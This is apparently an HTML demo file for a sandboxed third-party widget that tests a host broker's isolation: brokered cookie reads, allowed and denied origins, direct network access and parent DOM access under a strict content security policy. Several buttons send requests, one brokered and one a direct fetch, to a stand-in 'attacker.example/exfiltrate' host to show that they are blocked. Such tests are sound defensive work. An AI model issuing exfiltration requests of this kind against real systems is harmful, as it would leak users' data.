@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; media-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
+  <meta name="referrer" content="no-referrer">
+  <title>ScriptSentinel isolated widget</title>
+  <style>
+    body { font: 14px/1.5 system-ui, sans-serif; margin: 0; padding: 16px; color: #172033; background: #f7f9fc; }
+    h2 { margin: 0 0 6px; font-size: 17px; }
+    p { margin: 0 0 12px; color: #566176; font-size: 12px; }
+    .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    button { border: 1px solid #cbd5e1; border-radius: 6px; padding: 8px; background: white; text-align: left; cursor: pointer; }
+    pre { min-height: 36px; overflow-wrap: anywhere; white-space: pre-wrap; padding: 8px; background: #e9eef6; border-radius: 6px; font-size: 11px; }
+  </style>
+</head>
+<body>
+  <h2>Isolated third-party widget</h2>
+  <p>Try a brokered capability, a denied request, direct egress, or a parent DOM read.</p>
+  <div class="actions">
+    <button id="cookie">Read cookie capability</button>
+    <button id="trusted">Request trusted origin</button>
+    <button id="untrusted">Request untrusted origin</button>
+    <button id="egress">Try direct network access</button>
+    <button id="parent">Try parent DOM access</button>
+    <button id="reload">Reload this frame</button>
+  </div>
+  <pre id="result" aria-live="polite">Waiting for host policy…</pre>
+  <script>
+    (() => {
+      "use strict";
+
+      const pending = new Map();
+      const result = document.getElementById("result");
+      let nextId = 0;
+      let heartbeat;
+
+      function request(type, payload) {
+        return new Promise((resolve, reject) => {
+          const id = `frame-${Date.now()}-${nextId++}`;
+          const timeout = setTimeout(() => {
+            pending.delete(id);
+            reject(new Error("Broker request timed out."));
+          }, 3000);
+          pending.set(id, { resolve, reject, timeout });
+          parent.postMessage({ id, type, payload }, "*");
+        });
+      }
+
+      function report(type, payload) {
+        parent.postMessage({ id: `event-${Date.now()}-${nextId++}`, type, payload }, "*");
+      }
+
+      window.addEventListener("message", event => {
+        if (event.source !== parent || event.origin !== "null" ||
+            !event.data || typeof event.data.id !== "string") {
+          return;
+        }
+        const requestState = pending.get(event.data.id);
+        if (!requestState) {
+          return;
+        }
+        clearTimeout(requestState.timeout);
+        pending.delete(event.data.id);
+        if (event.data.success) {
+          requestState.resolve(event.data.value);
+        } else {
+          requestState.reject(new Error(String(event.data.error || "Request denied.")));
+        }
+      });
+
+      async function showRequest(type, payload, label) {
+        result.textContent = `${label}…`;
+        try {
+          const value = await request(type, payload);
+          result.textContent = `${label}: ${JSON.stringify(value)}`;
+        } catch (error) {
+          result.textContent = `${label}: ${error.message}`;
+        }
+      }
+
+      document.getElementById("cookie").addEventListener("click", () => {
+        void showRequest("READ_COOKIE", null, "Cookie capability");
+      });
+      document.getElementById("trusted").addEventListener("click", () => {
+        void showRequest("NETWORK_FETCH", {
+          url: "https://trusted-analytics.example/collect",
+          method: "GET"
+        }, "Trusted-origin request");
+      });
+      document.getElementById("untrusted").addEventListener("click", () => {
+        void showRequest("NETWORK_FETCH", {
+          url: "https://attacker.example/exfiltrate",
+          method: "GET"
+        }, "Untrusted-origin request");
+      });
+      document.getElementById("egress").addEventListener("click", async () => {
+        result.textContent = "Trying direct fetch; the sandbox CSP should block it…";
+        try {
+          await fetch("https://attacker.example/exfiltrate", { mode: "no-cors" });
+          result.textContent = "Unexpectedly completed. Check browser CSP support and console.";
+        } catch (error) {
+          result.textContent = `Direct egress blocked: ${error.message}`;
+        }
+      });
+      document.getElementById("parent").addEventListener("click", () => {
+        try {
+          result.textContent = parent.document.title;
+        } catch (error) {
+          result.textContent = `Parent access blocked: ${error.name}`;
+        }
+      });
+      document.getElementById("reload").addEventListener("click", () => location.reload());
+
+      window.addEventListener("error", event => {
+        report("FRAME_ERROR", { message: String(event.message || "Uncaught frame error.").slice(0, 200) });
+      });
+      window.addEventListener("unhandledrejection", event => {
+        const reason = event.reason;
+        report("FRAME_UNHANDLED_REJECTION", {
+          message: String(reason && reason.message ? reason.message : reason || "Unhandled rejection.").slice(0, 200)
+        });
+      });
+      window.addEventListener("securitypolicyviolation", event => {
+        report("CSP_VIOLATION", {
+          directive: String(event.violatedDirective || "unknown-directive").slice(0, 200),
+          blockedURI: String(event.blockedURI || "blocked").slice(0, 200)
+        });
+      });
+      window.addEventListener("pagehide", () => {
+        clearInterval(heartbeat);
+        report("FRAME_PAGEHIDE", null);
+      });
+
+      void request("FRAME_READY", null).then(() => {
+        result.textContent = "Ready. No host cookies or external network access are exposed.";
+        heartbeat = setInterval(() => {
+          void request("FRAME_HEARTBEAT", null).catch(() => clearInterval(heartbeat));
+        }, 1000);
+      }).catch(error => {
+        result.textContent = `Host broker unavailable: ${error.message}`;
+      });
+    })();
+  </script>
+</body>
+</html>
